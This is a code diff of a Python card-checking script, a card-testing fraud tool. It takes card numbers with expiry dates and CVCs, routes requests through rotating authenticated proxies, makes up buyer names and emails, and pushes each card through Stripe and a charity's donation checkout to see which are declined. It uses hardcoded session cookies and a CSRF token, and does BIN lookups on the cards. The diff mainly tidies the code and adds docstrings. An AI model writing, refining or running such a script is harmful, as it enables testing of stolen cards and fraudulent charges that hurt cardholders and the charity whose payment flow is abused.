@@ -2,14 +2,18 @@ import requests
 import random
 import string
 
+
 # Load proxies from the file
 def load_proxies(file_path):
+    """Load proxies from a file."""
     with open(file_path, 'r') as file:
         proxies = [line.strip() for line in file if line.strip()]
     return proxies
 
+
 # Select a random proxy
 def get_random_proxy(proxies):
+    """Select a random proxy from the list."""
     proxy = random.choice(proxies)
     ip_port, credentials = proxy.split('@')
     proxy_url = f"http://{credentials}@{ip_port}"
@@ -18,52 +22,59 @@ def get_random_proxy(proxies):
         "https": proxy_url,
     }
 
+
 # Generate random names
 def generate_name():
+    """Generate a random first and last name."""
     first_names = ["John", "Jane", "Alex", "Emily", "Chris", "Katie", "Michael", "Sarah", "David", "Laura"]
     last_names = ["Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia", "Miller", "Davis", "Martinez", "Lopez"]
-    first_name = random.choice(first_names)
-    last_name = random.choice(last_names)
-    return first_name, last_name
+    return random.choice(first_names), random.choice(last_names)
+
 
 # Generate a random email
 def generate_email(first_name, last_name):
+    """Generate a random email using the given names."""
     domains = ["gmail.com", "hotmail.com", "yahoo.com", "protonmail.com", "proton.me"]
     random_numbers = ''.join(random.choices(string.digits, k=3))
-    email = f"{first_name.lower()}.{last_name.lower()}{random_numbers}@{random.choice(domains)}"
-    return email
+    return f"{first_name.lower()}.{last_name.lower()}{random_numbers}@{random.choice(domains)}"
+
 
 # Perform BIN lookup
-def bin_lookup_with_proxy(card_number, proxies):
+def bin_lookup(card_number, proxies):
+    """Fetch BIN details using the first 6 digits of the card."""
     try:
-        bin_number = card_number[:6]  # Extract first 6 digits of the card
-        proxy = get_random_proxy(proxies)  # Use a random proxy
+        bin_number = card_number[:6]
+        proxy = get_random_proxy(proxies)
         response = requests.get(f"https://lookup.binlist.net/{bin_number}", proxies=proxy, timeout=10)
-        
         if response.status_code == 200:
-            return response.json()  # Return JSON response on success
-        else:
-            print(f"BIN Lookup Failed: {response.status_code} - {response.text}")
-            return None
+            data = response.json()
+            return {
+                "scheme": data.get("scheme", "Unknown").upper(),
+                "type": data.get("type", "Unknown").capitalize(),
+                "brand": data.get("brand", "Unknown").upper(),
+                "bank": data.get("bank", {}).get("name", "N/A"),
+                "country": data.get("country", {}).get("name", "Unknown"),
+                "emoji": data.get("country", {}).get("emoji", ""),
+            }
+        return None
     except requests.RequestException as e:
-        print(f"BIN Lookup Error with Proxy: {e}")
+        print(f"BIN Lookup Error: {e}")
         return None
 
 
 # Main card-checking function
 def check_card(card_number, exp_month, exp_year, cvc, proxies):
+    """Check a card and return the payment response."""
     try:
         # Normalize year
         exp_year = f"20{exp_year}" if len(exp_year) == 2 else exp_year
-
-        # Generate random name and email
         first_name, last_name = generate_name()
         email = generate_email(first_name, last_name)
 
         # Part 1: Generate payment token
         url1 = 'https://api.stripe.com/v1/payment_methods'
         headers1 = {
-    'authority': 'api.stripe.com',
+             'authority': 'api.stripe.com',
     'accept': 'application/json',
     'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
     'content-type': 'application/x-www-form-urlencoded',
@@ -78,7 +89,7 @@ def check_card(card_number, exp_month, exp_year, cvc, proxies):
     'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
         }
         data1 = {
-    'billing_details[address][city]': 'Clear Lake',
+             'billing_details[address][city]': 'Clear Lake',
     'billing_details[address][country]': 'US',
     'billing_details[address][line1]': '48 1 1/2 Street',
     'billing_details[address][line2]': '',
@@ -112,7 +123,6 @@ def check_card(card_number, exp_month, exp_year, cvc, proxies):
         response1 = requests.post(url1, headers=headers1, data=data1, proxies=proxy)
         response_data = response1.json()
 
-        # Extract token and brand
         payment_token = response_data.get("id")
         display_brand = response_data.get("card", {}).get("brand", "").upper()
 
@@ -134,7 +144,7 @@ def check_card(card_number, exp_month, exp_year, cvc, proxies):
     '__stripe_sid': 'a4df5967-e71a-4b4c-af9a-4f04e3ab12d591c1ad',
 }
         headers2 = {
-            'authority': 'www.pawsforpurplehearts.org',
+              'authority': 'www.pawsforpurplehearts.org',
     'accept': 'application/json, text/plain, */*',
     'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
     'content-type': 'application/json;charset=UTF-8',
@@ -150,7 +160,7 @@ def check_card(card_number, exp_month, exp_year, cvc, proxies):
     'x-csrf-token': 'BeBs9PbGzcmxNmJkYzM2YWU2YzMyMWMwOWFhNDdkZDBhZTJkMmZi',
         }
         json_data = {
-               'email': email,
+              'email': email,
     'subscribeToList': False,
     'shippingAddress': {
         'id': '',
@@ -206,25 +216,10 @@ def check_card(card_number, exp_month, exp_year, cvc, proxies):
         response2 = requests.post(url2, cookies=cookies, headers=headers2, json=json_data, proxies=proxy)
         api_response = response2.json()
 
-          # Check for PAYMENT_DECLINED
+        # Return the appropriate response
         if api_response.get("failureType") == "PAYMENT_DECLINED":
-            bin_data = bin_lookup_with_proxy(card_number, proxies)  # Use proxy for BIN lookup
-            if bin_data:
-                # Format the custom response
-                return f"""𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 ❌
-
-𝗖𝗮𝗿𝗱: {card_number}|{exp_month}|{exp_year}|{cvc}
-𝐆𝐚𝐭𝐞𝐰𝐚𝐲: Stripe Auth + 1$ charge
-
-𝗜𝗻𝗳𝗼: {bin_data.get('scheme', '').upper()} - {bin_data.get('type', '').capitalize()} - {bin_data.get('brand', '')}
-𝐈𝐬𝐬𝐮𝐞𝐫: {bin_data.get('bank', {}).get('name', 'N/A')}
-𝐂𝐨𝐮𝐧𝐭𝐫𝐲: {bin_data.get('country', {}).get('name', 'Unknown')} {bin_data.get('country', {}).get('emoji', '')}
-"""
-            else:
-                return "Declined ❌ - BIN Lookup Failed."
-        else:
-            # Return the full response for other cases
-            return str(api_response)
+            return "Declined ❌"
+        return f"Response: {api_response}"
 
     except Exception as e:
         return f"Error during processing: {e}"
